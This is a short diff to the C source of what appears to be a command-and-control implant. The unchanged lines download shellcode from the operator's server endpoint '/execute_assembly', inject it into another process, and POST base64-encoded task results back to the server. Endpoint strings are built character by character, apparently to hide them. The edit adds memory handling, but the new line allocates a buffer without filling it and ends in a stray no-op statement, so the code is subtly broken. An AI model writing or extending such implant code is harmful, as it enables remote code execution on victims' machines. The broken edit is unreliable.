@@ -327,7 +327,7 @@ void myMain()
             WCHAR cAssemblyEndpoint[] = { '/', 'e', 'x', 'e', 'c', 'u', 't', 'e', '_', 'a', 's', 's', 'e', 'm', 'b', 'l', 'y', '/', 0 };
             LPVOID shellcode = httpGetExecutable(api, &dwShellcodeSize, cAssemblyEndpoint, wServer, port);
             ((INJECTINTOPROCESS)PEsgStdApi->injectIntoProcess)(shellcode, dwShellcodeSize, (LPCSTR)lpApplicationName);
-            taskOutput = TASK_EXECUTE_ASSEMBLY;
+            taskOutput = ((CALLOC)api->calloc)(myStrlenA(TASK_EXECUTE_ASSEMBLY)+1, sizeof(CHAR));  TASK_EXECUTE_ASSEMBLY;
         }
         else
         {
@@ -350,6 +350,8 @@ void myMain()
         ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, task.taskId, task.agentUuid, b64EncodedOutput);
         PostRequest(api, wServer, port, pathSendTaskOutput, json);
 
+        ((FREE)api->free)(taskOutput);
+        taskOutput = NULL;
         ((FREE)api->free)(task.taskId);
         task.taskId = NULL;
         ((FREE)api->free)(task.taskParams);
